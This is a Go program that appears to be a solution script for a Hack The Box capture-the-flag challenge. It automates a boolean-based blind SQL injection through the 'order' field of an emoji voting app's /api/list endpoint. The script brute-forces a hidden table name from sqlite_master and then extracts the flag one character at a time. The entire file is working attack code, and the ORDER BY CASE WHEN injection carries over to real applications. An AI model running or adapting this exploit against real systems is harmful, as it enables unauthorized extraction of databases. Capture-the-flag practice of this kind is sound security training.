package main

import (
	"bytes"
	"fmt"
	"flag"
	"log"
	"os"
	"encoding/json"
	"net/http"
	"time"
	"strings"
)

type ResponseData struct {
	Id int `json:"id"`
	Emoji string `json:"emoji"`
	Name string `json:"name"`
	Count int `json:"count"`
}

func sendPayload(targetUrl string, payload string) []ResponseData {
	payloadJson := map[string]string{"order": payload}
	jsonData, err := json.Marshal(payloadJson)
	if err != nil {
		panic(err)	
	}

	client := &http.Client{Timeout: 10 * time.Second}

	listEndpointUrl := fmt.Sprintf("%s/api/list", targetUrl)

	req, err := http.NewRequest(
		"POST", 
		listEndpointUrl,
		bytes.NewReader(jsonData))
	if err != nil {
		panic(err)	
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		panic(err)	
	}
	defer resp.Body.Close()

	var results []ResponseData

	err = json.NewDecoder(resp.Body).Decode(&results)
	if err != nil {
		panic(err)	
	}	

	return results
}

func main() {
	targetUrl := flag.String("target_url", "", "Target URL for emoji voting")

	flag.Parse()

	if *targetUrl == "" {
		log.Println("Error: No target URL provided")
		flag.PrintDefaults()
		os.Exit(1)
	}

	fmt.Println("Extracting flag table name...\n")

	flagTableId := "" 

	for _ = range [5]int{} {
		for i := 0; i <= 255; i++ {
			nextTableId := fmt.Sprintf("%s%02X",flagTableId, i)
			payload := fmt.Sprintf("CASE WHEN (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE 'flag\\_%s%%' ESCAPE '\\') > 0 THEN id ELSE count END ASC", nextTableId)
			responseData := sendPayload(*targetUrl, payload)
			if responseData[0].Id == 1 {
				flagTableId = nextTableId
				fmt.Printf("Flag Table Name fragment: flag_%s\n", flagTableId)
				break
			}
		}
	} 


	flagTableName := fmt.Sprintf("flag_%s", flagTableId)
	fmt.Printf("\nFull flag table name: %s\n", flagTableName)

	fmt.Println("\nExtracting flag...\n")

	const charSet = "abcdefghijklmnopqrstuvwxyz_{}"
	flag := "HTB"

	for {
		if flag != "" && flag[len(flag)-1] == '}' {
			break 
		}
		for _, char := range charSet {
			nextFlag := fmt.Sprintf("%s%c", flag, char)
			nextFlag = strings.ReplaceAll(nextFlag, "_", "\\_")

			payload := fmt.Sprintf("CASE WHEN (SELECT COUNT(*) FROM %s WHERE flag LIKE '%s%%' ESCAPE '\\') > 0 THEN id ELSE count END ASC", flagTableName, nextFlag)
			responseData := sendPayload(*targetUrl, payload)
			if responseData[0].Id == 1 {
				flag = nextFlag 
				flag = strings.ReplaceAll(flag, "\\_", "_")
				fmt.Printf("Flag fragment: %s\n", flag)
				break
			}
		}

	}

	fmt.Printf("\n\nFound Flag: %s\n", flag)
}
